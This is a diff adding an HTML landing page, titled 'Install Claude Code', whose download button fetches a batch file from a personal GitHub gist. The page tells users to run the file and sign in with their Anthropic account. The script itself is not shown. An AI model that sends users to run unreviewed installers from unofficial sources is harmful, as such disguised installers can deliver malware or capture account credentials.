@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Install Claude Code</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 60px 40px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+        }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: #1a1a2e;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 40px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            color: white;
+            text-decoration: none;
+            padding: 18px 50px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(99, 102, 241, 0.5);
+        }
+
+        .steps {
+            margin-top: 50px;
+            text-align: left;
+        }
+
+        .steps h3 {
+            color: #1a1a2e;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 16px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+
+        .step-num {
+            background: #6366f1;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            margin-right: 14px;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            color: #444;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        .note {
+            margin-top: 30px;
+            padding: 16px;
+            background: #fef3c7;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #92400e;
+        }
+
+        .footer {
+            margin-top: 40px;
+            color: #999;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🤖</div>
+        <h1>Claude Code</h1>
+        <p class="subtitle">Your AI coding assistant, one click away</p>
+
+        <a href="https://gist.githubusercontent.com/laviefatigue/743b52161fb47ffacc1bc73fcaecd7a0/raw/Install-ClaudeCode.bat"
+           class="download-btn"
+           download="Install-ClaudeCode.bat">
+            Download Installer
+        </a>
+
+        <div class="steps">
+            <h3>How to install</h3>
+
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-text">Click the <strong>Download</strong> button above</div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-text">Open the downloaded file <strong>Install-ClaudeCode.bat</strong></div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-text">Follow the prompts to sign in with your Anthropic account</div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">4</div>
+                <div class="step-text">Open VS Code, press <strong>Ctrl+`</strong> and type <strong>claude</strong></div>
+            </div>
+        </div>
+
+        <div class="note">
+            ⚠️ Requires Windows 10/11 and a Claude Pro, Max, or Teams subscription
+        </div>
+
+        <div class="footer">
+            Installs: VS Code, Git, Claude Code CLI
+        </div>
+    </div>
+</body>
+</html>
